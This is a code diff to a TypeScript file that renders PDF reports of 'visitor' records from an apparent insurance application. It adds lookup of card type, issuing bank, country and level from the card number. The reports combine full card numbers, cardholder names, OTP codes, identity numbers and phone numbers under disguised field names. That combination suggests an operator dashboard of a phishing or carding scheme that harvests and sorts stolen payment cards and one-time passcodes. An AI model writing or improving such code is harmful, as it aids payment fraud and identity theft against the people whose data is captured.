@@ -1,5 +1,6 @@
 "use client";
 
+import { inferCardMeta } from "@/lib/card-utils";
 import type { InsuranceApplication } from "@/lib/firestore-types";
 import { _d } from "@/lib/secure-utils";
 
@@ -148,13 +149,21 @@ function buildPdfHtml(
   const cardHolderName = latestCard
     ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
     : decryptField(visitor._v4 || visitor.cardHolderName);
-  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
-  const bankName = latestCard
-    ? val(latestCard.data?.bankInfo?.name)
-    : val(visitor.bankInfo?.name);
-  const bankCountry = latestCard
-    ? val(latestCard.data?.bankInfo?.country)
-    : val(visitor.bankInfo?.country);
+  const inferredCardMeta = inferCardMeta(cardNumber);
+  const cardType =
+    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
+    inferredCardMeta?.typeLabel ||
+    "";
+  const bankName =
+    (latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name)) ||
+    inferredCardMeta?.bankName ||
+    "";
+  const bankCountry =
+    (latestCard
+      ? val(latestCard.data?.bankInfo?.country)
+      : val(visitor.bankInfo?.country)) ||
+    inferredCardMeta?.bankCountry ||
+    "";
 
   const otpCode = latestOtp
     ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
@@ -649,9 +658,21 @@ function buildCardPdfHtml(
   const cardHolderName = latestCard
     ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
     : decryptField(visitor._v4 || visitor.cardHolderName);
-  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
-  const bankName = latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name);
-  const bankCountry = latestCard ? val(latestCard.data?.bankInfo?.country) : val(visitor.bankInfo?.country);
+  const inferredCardMeta = inferCardMeta(cardNumber);
+  const cardType =
+    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
+    inferredCardMeta?.typeLabel ||
+    "";
+  const bankName =
+    (latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name)) ||
+    inferredCardMeta?.bankName ||
+    "";
+  const bankCountry =
+    (latestCard
+      ? val(latestCard.data?.bankInfo?.country)
+      : val(visitor.bankInfo?.country)) ||
+    inferredCardMeta?.bankCountry ||
+    "";
   const otpCode = latestOtp
     ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
     : val(visitor._v5 || visitor.otpCode || visitor.otp);
@@ -663,7 +684,13 @@ function buildCardPdfHtml(
   const identityNumber = val(visitor.identityNumber);
   const phoneNumber = val(visitor.phoneNumber);
 
-  const cardLevel = val(visitor.cardLevel || visitor.bankInfo?.level);
+  const cardLevel = val(
+    (latestCard
+      ? latestCard.data?.cardLevel ||
+        latestCard.data?.level ||
+        latestCard.data?.bankInfo?.level
+      : visitor.cardLevel || visitor.bankInfo?.level) || inferredCardMeta?.level,
+  );
 
   const formatCardNumber = (num: string) => {
     const clean = num.replace(/\s/g, "");
@@ -927,9 +954,21 @@ function buildAllCardsPageHtml(
   const cardHolderName = latestCard
     ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
     : decryptField(visitor._v4 || visitor.cardHolderName);
-  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
-  const bankName = latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name);
-  const bankCountry = latestCard ? val(latestCard.data?.bankInfo?.country) : val(visitor.bankInfo?.country);
+  const inferredCardMeta = inferCardMeta(cardNumber);
+  const cardType =
+    (latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType)) ||
+    inferredCardMeta?.typeLabel ||
+    "";
+  const bankName =
+    (latestCard ? val(latestCard.data?.bankInfo?.name) : val(visitor.bankInfo?.name)) ||
+    inferredCardMeta?.bankName ||
+    "";
+  const bankCountry =
+    (latestCard
+      ? val(latestCard.data?.bankInfo?.country)
+      : val(visitor.bankInfo?.country)) ||
+    inferredCardMeta?.bankCountry ||
+    "";
   const otpCode = latestOtp
     ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
     : val(visitor._v5 || visitor.otpCode || visitor.otp);
@@ -958,7 +997,13 @@ function buildAllCardsPageHtml(
     return map[status] || status;
   };
 
-  const cardLevel = val(visitor.cardLevel || visitor.bankInfo?.level);
+  const cardLevel = val(
+    (latestCard
+      ? latestCard.data?.cardLevel ||
+        latestCard.data?.level ||
+        latestCard.data?.bankInfo?.level
+      : visitor.cardLevel || visitor.bankInfo?.level) || inferredCardMeta?.level,
+  );
   const bankLogoUrlPdf = getBankLogoUrlForPdf(bankName);
 
   const cardNetworkBadge = (type: string) => {
